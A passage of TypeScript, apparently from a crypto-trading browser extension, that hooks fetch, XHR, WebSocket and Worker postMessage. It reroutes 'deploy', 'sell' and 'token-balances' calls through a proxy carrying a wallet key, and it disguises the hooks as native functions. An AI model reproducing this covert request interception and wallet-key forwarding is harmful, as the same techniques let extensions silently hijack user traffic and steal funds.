      const entries: Record<string, string> = {};
      fd.forEach((v, k) => { entries[k] = String(v); });
      bodyStr = _JSON.stringify({ __formData: true, entries });
    } else if (msg.body) {
      const raw = typeof msg.body === "string" ? msg.body : _JSON.stringify(msg.body);
      bodyStr = raw;
      if (endpoint === "sell") {
        if (auth.sniperWallets) {
          try {
            const parsed = _JSON.parse(raw);
            const sellPubkey = parsed.wallet_public_keys?.[0];
            if (sellPubkey) {
              const sniper = auth.sniperWallets.find((s: any) => s.address === sellPubkey);
              if (sniper) walletKey = sniper.walletKey;
            }
          } catch {}
        }
        tbHeader = buildTokenBalancesHeader(raw) || undefined;
      }
      if (endpoint === "token-balances") {
        let parsed: Record<string, unknown> = {};
        try { parsed = _JSON.parse(raw); } catch {}
        const mintAddress = (parsed.mint_address || "") as string;
        bodyStr = _JSON.stringify({
          mint_address: mintAddress,
          platform: parsed.platform || "",
          wallet_public_keys: buildWalletKeys(parsed),
        });
      }
    }
    return proxyRlRequest({
      endpoint: endpoint as "deploy" | "sell" | "token-balances",
      method: msg.method || "POST",
      body: bodyStr,
      walletKey,
      platform: auth.platform || "",
      tokenBalances: tbHeader,
    }).then((resp: Response) => {
      if (endpoint === "token-balances") {
        const rawBody = typeof msg.body === "string" ? msg.body : "{}";
        let parsed: Record<string, unknown> = {};
        try { parsed = _JSON.parse(rawBody); } catch {}
        const mintAddress = (parsed.mint_address || "") as string;
        resp.clone().json().then((data: any) => {
          if (Array.isArray(data.balances) && mintAddress) {
            cacheTokenBalances(mintAddress, data.balances);
          }
        }).catch(() => {});
      }
      return resp.text().then((text: string) => {
        respond({ ok: resp.ok, status: resp.status, statusText: resp.statusText, body: text });
      });
    });
  }).catch(() => {
    respond({ ok: false, status: 0, statusText: "Network error", body: "" });
  });
  return true;
}
const _workerPMProxy = new _Proxy(_WorkerPM, {
  apply(target: any, thisArg: any, args: any[]) {
    try {
      const msg = args[0];
      if (msg && typeof msg === "object" && typeof msg.url === "string") {
        if (handleWorkerMessage(thisArg as Worker, msg)) return;
      }
    } catch {}
    return _Reflect.apply(target, thisArg, args);
  },
});
_defineProperty(_workerPMProxy, "name", {
  value: "postMessage",
  writable: false,
  enumerable: false,
  configurable: true,
});
_defineProperty(_workerPMProxy, "length", {
  value: _WorkerPM.length,
  writable: false,
  enumerable: false,
  configurable: true,
});
Worker.prototype.postMessage = _workerPMProxy;
registerToStringEntries(CHANNEL_KEY, [
  [fetchProxy, nativeFetchStr],
  [_XHRProto.open, nativeXHROpenStr],
  [_XHRProto.send, nativeXHRSendStr],
  [_XHRProto.setRequestHeader, nativeXHRSetReqStr],
  [wsProxy, nativeWSStr],
  [_workerPMProxy, nativeWorkerPMStr],
]);
window.fetch = fetchProxy;
